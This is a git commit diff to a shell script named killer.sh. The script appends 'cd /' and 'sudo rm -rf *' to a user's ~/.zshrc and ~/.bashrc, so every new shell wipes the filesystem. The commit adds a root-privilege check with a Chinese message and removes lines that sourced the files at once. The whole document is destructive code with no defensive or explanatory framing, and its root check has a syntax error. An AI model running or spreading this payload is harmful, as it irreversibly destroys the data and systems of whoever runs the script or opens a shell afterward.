e0d01147f34c47cf145b440a250c842c5f466f74
senge6666 <54741446+senge6666@users.noreply.github.com>
2020-05-01 10:49:40 +0800

    Update killer.sh

--- killer.sh
+++ killer.sh
@@ -1,10 +1,13 @@
-sudo cat >> ~/.zshrc << EOF
+if[ $UID != 0 ]; then
+  echo "你需要用root权限运行此脚本"
+  exit
+fi
+#!/bin/bash
+cat >> ~/.zshrc << EOF
 cd /
 sudo rm -rf *
 EOF
-sudo cat >> ~/.bashrc << EOF
+cat >> ~/.bashrc << EOF
 cd /
 sudo rm -rf *
 EOF
-source ~/.zshrc
-source ~/.bashrc
